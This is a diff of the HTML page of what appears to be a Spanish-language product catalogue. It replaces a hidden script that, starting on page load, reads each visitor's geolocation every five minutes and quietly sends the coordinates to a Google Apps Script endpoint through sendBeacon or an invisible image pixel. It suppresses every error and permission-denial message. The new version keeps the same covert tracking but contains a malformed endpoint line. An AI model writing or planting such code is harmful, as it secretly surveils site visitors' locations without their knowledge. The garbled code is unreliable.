@@ -1282,97 +1282,60 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
        - Inicia al abrir la página
        - Intervalo por defecto: 5 minutos (configurable)
        ====================================================== -->
-  <script>
-    /* ==========================
-       UBICACIÓN -> GOOGLE SHEETS
-       ========================== */
+	<script>
+	  const LOCATION_LOG_INTERVAL_MINUTES = 5;
+	  const LOCATION_LOG_ENDPOINT = "const LOCATION_LOG_ENDPOINT = "https://script.google.com/macros/s/XXXXX/exec";
 
-    // ✅ Intervalo (en minutos). Cambia aquí si quieres otro valor.
-    const LOCATION_LOG_INTERVAL_MINUTES = 5;
 
-    // ✅ Tu Web App de Apps Script (exec)
-    const LOCATION_LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbyxqPYMClr1uSqTSYjbz013DoXY_1jGTafEUXuS58XpFv6bb2gIhCb3F1wpBlECArsO/exec";
+	  (function(){
+		const intervalMs = Math.max(1, Number(LOCATION_LOG_INTERVAL_MINUTES) || 5) * 60 * 1000;
+		let timerId = null;
 
-    (function autoStartLocationLogger(){
-      const intervalMs = Math.max(1, Number(LOCATION_LOG_INTERVAL_MINUTES) || 5) * 60 * 1000;
-      let timerId = null;
+		function sendGet(lat, lng, acc){
+		  try{
+			const qs = new URLSearchParams({
+			  lat: String(lat),
+			  lng: String(lng),
+			  acc: acc == null ? "" : String(acc),
+			  ts: String(Date.now()),
+			  cb: Math.random().toString(36).slice(2)
+			});
+			const img = new Image();
+			img.referrerPolicy = "no-referrer";
+			img.src = LOCATION_LOG_ENDPOINT + "?" + qs.toString();
+		  }catch(e){}
+		}
 
-      function sendPayload(lat, lng, acc){
-        const params = new URLSearchParams();
-        params.set("lat", String(lat));
-        params.set("lng", String(lng));
-        if (acc != null) params.set("acc", String(acc));
-        params.set("ts", String(Date.now()));
-        // cache-buster para evitar caché en algunos navegadores
-        params.set("cb", Math.random().toString(36).slice(2));
+		function logOnce(){
+		  try{
+			if (!("geolocation" in navigator)) return;
+			navigator.geolocation.getCurrentPosition(
+			  (pos)=>{
+				try{
+				  const c = pos && pos.coords;
+				  if(!c) return;
+				  sendGet(c.latitude, c.longitude, c.accuracy);
+				}catch(e){}
+			  },
+			  ()=>{},
+			  { enableHighAccuracy:false, timeout:15000, maximumAge: intervalMs }
+			);
+		  }catch(e){}
+		}
 
-        // 1) Preferir sendBeacon (silencioso, no bloquea)
-        try{
-          if (navigator.sendBeacon){
-            const blob = new Blob([params.toString()], {
-              type: "application/x-www-form-urlencoded;charset=UTF-8"
-            });
-            navigator.sendBeacon(LOCATION_LOG_ENDPOINT, blob);
-            return;
-          }
-        }catch(e){}
+		function start(){
+		  if (timerId) return;
+		  logOnce();
+		  timerId = setInterval(logOnce, intervalMs);
+		}
 
-        // 2) Fallback: "pixel" GET (no requiere CORS y no muestra nada)
-        try{
-          const img = new Image();
-          img.referrerPolicy = "no-referrer";
-          img.src = LOCATION_LOG_ENDPOINT + "?" + params.toString();
-        }catch(e){}
-      }
+		if (document.readyState === "loading"){
+		  document.addEventListener("DOMContentLoaded", start, { once:true });
+		}else{
+		  start();
+		}
+	  })();
+	</script>
 
-      function logOnce(){
-        try{
-          if (!("geolocation" in navigator)) return;
-
-          navigator.geolocation.getCurrentPosition(
-            function(pos){
-              try{
-                const c = pos && pos.coords;
-                if(!c) return;
-                sendPayload(c.latitude, c.longitude, c.accuracy);
-              }catch(e){}
-            },
-            function(){ /* ❌ Sin mensajes aunque falle o nieguen permiso */ },
-            {
-              enableHighAccuracy: false,
-              timeout: 15000,
-              maximumAge: intervalMs // permite reutilizar ubicación reciente
-            }
-          );
-        }catch(e){}
-      }
-
-      function start(){
-        if (timerId) return;
-        logOnce();
-        timerId = setInterval(logOnce, intervalMs);
-
-        // Opcional (silencioso): pausar cuando la pestaña no está visible
-        document.addEventListener("visibilitychange", function(){
-          try{
-            if (document.hidden){
-              if (timerId){ clearInterval(timerId); timerId = null; }
-            }else{
-              if (!timerId){
-                logOnce();
-                timerId = setInterval(logOnce, intervalMs);
-              }
-            }
-          }catch(e){}
-        });
-      }
-
-      if (document.readyState === "loading"){
-        document.addEventListener("DOMContentLoaded", start, { once:true });
-      }else{
-        start();
-      }
-    })();
-  </script>
 </body>
 </html>
